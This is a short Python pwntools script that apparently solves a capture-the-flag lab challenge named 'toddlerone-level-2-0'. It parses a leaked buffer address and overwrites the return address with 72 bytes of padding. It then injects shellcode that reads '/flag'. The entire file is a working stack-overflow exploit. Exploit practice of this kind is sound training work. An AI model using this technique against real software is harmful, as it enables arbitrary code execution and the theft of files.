
#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --


-----------------------------
'''

context.log_level = 'CRITICAL'
context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-2-0')

p = elf.process()

p.recvuntil(b'The input buffer begins at 0x')
addr = p.recvuntil(b',').decode()[:-1]
addr = p64(int(addr, 16) + 80)

assembly = shellcraft.cat('/flag')
shellcode = asm(assembly)

delta_len = 72
padding = b'A' * delta_len
bytestream = padding + addr + shellcode

p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
